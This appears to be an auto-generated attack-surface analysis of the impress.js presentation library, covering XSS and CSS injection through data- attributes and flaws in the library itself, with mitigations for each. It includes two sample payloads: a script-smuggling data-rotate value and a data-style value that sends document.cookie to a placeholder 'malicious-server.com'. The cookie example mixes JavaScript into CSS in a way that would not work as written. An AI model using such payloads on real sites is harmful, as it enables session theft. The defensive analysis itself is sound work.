# Attack Surface Analysis for impress/impress.js

## Attack Surface: [Cross-Site Scripting (XSS) via `data-` Attributes](./attack_surfaces/cross-site_scripting__xss__via__data-__attributes.md)

*   **Description:** Malicious JavaScript code is injected into `data-` attributes of HTML elements used by impress.js to define presentation steps and styling.
    *   **How impress.js Contributes:** Impress.js's core functionality relies *heavily* on `data-` attributes for positioning, rotation, scaling, and other presentation features. This creates a large and *direct* attack surface if user input is reflected in these attributes without proper sanitization. This is the most significant impress.js-specific vulnerability.
    *   **Example:**
        ```html
        <div id="step1" data-x="100" data-y="200" data-rotate="';alert('XSS');//">
            <!-- Presentation content -->
        </div>
        ```
        (Simplified example; real attacks would be more complex.)
    *   **Impact:**
        *   Execution of arbitrary JavaScript in the victim's browser.
        *   Theft of cookies and session tokens.
        *   Redirection to malicious websites.
        *   Defacement of the presentation.
        *   Keylogging and data exfiltration.
    *   **Risk Severity:** Critical
    *   **Mitigation Strategies:**
        *   **Strict Input Validation:** Implement rigorous validation of *all* user-supplied data that will be used in *any* `data-` attribute.  Define a whitelist of allowed characters and formats (numbers, specific units like "px" or "deg", and a *very* limited set of other characters). Reject *any* input that doesn't strictly conform.
        *   **Context-Specific Encoding:** *After* validation, encode the data appropriately for the *specific* `data-` attribute context. This is crucial. Different attributes may require different encoding (HTML entity encoding, JavaScript string escaping, or URL encoding). The goal is to prevent the browser from interpreting the data as executable code, *specifically within the context of how impress.js uses that attribute*.
        *   **Content Security Policy (CSP):** Implement a strong CSP that restricts the sources from which scripts can be loaded.  Specifically, avoid using `unsafe-inline` and `unsafe-eval` in your CSP directives. A well-configured CSP is a critical defense-in-depth measure.
        * **Avoid dynamic generation of data attributes:** If possible, avoid generating data attributes dynamically based on user input.

## Attack Surface: [CSS Injection via data attributes](./attack_surfaces/css_injection_via_data_attributes.md)

*   **Description:** Attacker injects malicious CSS rules through manipulated `data-` attributes, potentially leading to visual misrepresentation, data exfiltration, or denial of service.
    *   **How impress.js Contributes:** If impress.js or, more likely, *custom code built around impress.js*, uses `data-` attributes to dynamically set CSS styles, *and* user input is reflected in these attributes, it opens a *direct* CSS injection vulnerability. This is less inherent to impress.js than the XSS, but still a significant risk if `data-` attributes are misused.
    *   **Example:**
        ```html
        <div data-style="color: red; background-image: url('malicious-server.com/steal-data?cookie=' + document.cookie);">
        ```
        (This example attempts to exfiltrate cookies via a background image request.)
    *   **Impact:**
        *   **Phishing:** Altering the appearance of the presentation to mimic legitimate websites.
        *   **Data Exfiltration:** Using CSS selectors and properties to extract data and send it to an attacker-controlled server.
        *   **Denial of Service:** Injecting CSS that causes browser crashes.
    *   **Risk Severity:** High
    *   **Mitigation Strategies:**
        *   **Strict Input Validation:** Rigorously validate any user input used in `data-` attributes that influence CSS. Define a whitelist of allowed values.
        *   **Context-Specific Encoding:** Encode the data appropriately for the CSS context. Escape special characters used in CSS.
        *   **Avoid Dynamic CSS from User Input:** *Preferably*, avoid generating CSS styles directly from user input. Use predefined CSS classes or styles instead. This is the best mitigation.
        *   **Content Security Policy (CSP):** Use the `style-src` directive in your CSP to restrict the sources from which CSS can be loaded.

## Attack Surface: [Library Vulnerabilities (Impress.js Core)](./attack_surfaces/library_vulnerabilities__impress_js_core_.md)

* **Description:** Security vulnerabilities within the impress.js library itself.
    * **How Impress.js Contributes:** This is inherent to using *any* third-party library. Impress.js, like any software, could contain undiscovered vulnerabilities in its core JavaScript code, particularly in how it parses and handles `data-` attributes or manages event listeners.
    * **Example:** A hypothetical vulnerability in impress.js's parsing of `data-rotate` could allow for XSS even with some input validation, if the validation doesn't account for a specific edge case exploited by the vulnerability.
    * **Impact:** Varies depending on the specific vulnerability, but could range from XSS to denial-of-service.
    * **Risk Severity:** High
    * **Mitigation Strategies:**
        * **Keep Impress.js Updated:** Regularly update to the *latest* version of impress.js. This is the *most important* mitigation. Monitor the project's GitHub repository (or other official channels) for security advisories and promptly apply any security patches.
        * **Dependency Management:** Use a dependency management tool (npm, yarn) to track and manage the version of impress.js. This makes updates easier.
        * **Security Audits (Optional, High-Security Contexts):** For applications handling highly sensitive data, consider a security audit of the impress.js code, especially if using a customized version.
